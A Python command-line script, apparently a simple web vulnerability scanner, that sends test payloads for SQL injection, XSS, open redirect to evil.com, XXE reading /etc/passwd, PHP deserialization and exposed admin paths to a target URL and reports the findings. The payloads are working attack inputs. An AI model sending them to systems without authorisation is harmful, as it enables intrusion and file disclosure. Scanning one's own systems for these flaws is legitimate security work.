import requests
import argparse
import sys

def test_sql_injection(target):
    payload = "' OR '1'='1"
    test_url = f"{target}/?id={payload}"
    response = requests.get(test_url)

    if "SQL syntax" in response.text or response.status_code == 500:
        print("[Vulnerable] The server appears to be vulnerable to SQL Injection.")
    else:
        print("[Not Vulnerable] The server does not appear to be vulnerable to SQL Injection.")

def test_xss(target):
    payload = "<script>alert('XSS');</script>"
    test_url = f"{target}/?q={payload}"
    response = requests.get(test_url)

    if payload in response.text:
        print("[Vulnerable] The server appears to be vulnerable to XSS.")
    else:
        print("[Not Vulnerable] The server does not appear to be vulnerable to XSS.")

def test_open_redirect(target):
    payload = "http://evil.com"
    test_url = f"{target}/?redirect={payload}"
    response = requests.get(test_url, allow_redirects=False)

    if response.status_code == 302 and response.headers.get('Location') == payload:
        print("[Vulnerable] The server appears to be vulnerable to Open Redirect.")
    else:
        print("[Not Vulnerable] The server does not appear to be vulnerable to Open Redirect.")

def test_https(target):
    if target.startswith("https://"):
        print("[Secure] The server is using HTTPS.")
    else:
        print("[Not Secure] The server is not using HTTPS.")

def test_directory_listing(target):
    response = requests.get(target)

    if "Index of /" in response.text:
        print("[Vulnerable] The server has directory listing enabled.")
    else:
        print("[Not Vulnerable] The server does not have directory listing enabled.")

def test_admin_interface(target):
    admin_urls = ["/admin", "/admin/login", "/admin/index.php", "/administrator"]
    for admin_url in admin_urls:
        response = requests.get(target + admin_url)
        if response.status_code == 200:
            print(f"[Vulnerable] Admin interface found at {admin_url}.")
            return
    print("[Not Vulnerable] No admin interface found.")

def test_xxe(target):
    headers = {'Content-Type': 'application/xml'}
    payload = """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <foo>&xxe;</foo>"""
    response = requests.post(target, data=payload, headers=headers)

    if "root:" in response.text:
        print("[Vulnerable] The server appears to be vulnerable to XXE.")
    else:
        print("[Not Vulnerable] The server does not appear to be vulnerable to XXE.")

def test_insecure_deserialization(target):
    payload = {'serialized_object': 'O:1:"A":1:{s:4:"name";s:4:"test";}'}
    response = requests.post(target, data=payload)

    if response.status_code == 500 or "serialization" in response.text.lower():
        print("[Vulnerable] The server appears to be vulnerable to Insecure Deserialization.")
    else:
        print("[Not Vulnerable] The server does not appear to be vulnerable to Insecure Deserialization.")

def check_outdated_version(target):
    response = requests.get(target)
    server_header = response.headers.get('Server')

    if server_header:
        print(f"Server header: {server_header}")
        # Here you could add more logic to check against a list of known vulnerable versions
        if "Apache" in server_header:
            print("[Info] Check if your Apache version has known vulnerabilities.")
        elif "nginx" in server_header:
            print("[Info] Check if your Nginx version has known vulnerabilities.")
        else:
            print("[Info] Unknown server type. Please check manually.")
    else:
        print("[Info] No server header found.")

def main():
    parser = argparse.ArgumentParser(description="OWASP Top 10 Vulnerability Scanner")
    parser.add_argument("target", help="The target server URL (e.g., http://example.com)")
    args = parser.parse_args()

    while True:
        print("\nSelect OWASP Top 10 category to test:")
        print("1. SQL Injection")
        print("2. Cross-Site Scripting (XSS)")
        print("3. Open Redirect")
        print("4. HTTPS Usage")
        print("5. Directory Listing")
        print("6. Exposed Admin Interface")
        print("7. XML External Entities (XXE)")
        print("8. Insecure Deserialization")
        print("9. Using Components with Known Vulnerabilities")
        print("10. Exit")

        choice = input("Enter your choice (1-10): ")

        if choice == '1':
            test_sql_injection(args.target)
        elif choice == '2':
            test_xss(args.target)
        elif choice == '3':
            test_open_redirect(args.target)
        elif choice == '4':
            test_https(args.target)
        elif choice == '5':
            test_directory_listing(args.target)
        elif choice == '6':
            test_admin_interface(args.target)
        elif choice == '7':
            test_xxe(args.target)
        elif choice == '8':
            test_insecure_deserialization(args.target)
        elif choice == '9':
            check_outdated_version(args.target)
        elif choice == '10':
            sys.exit(0)
        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()
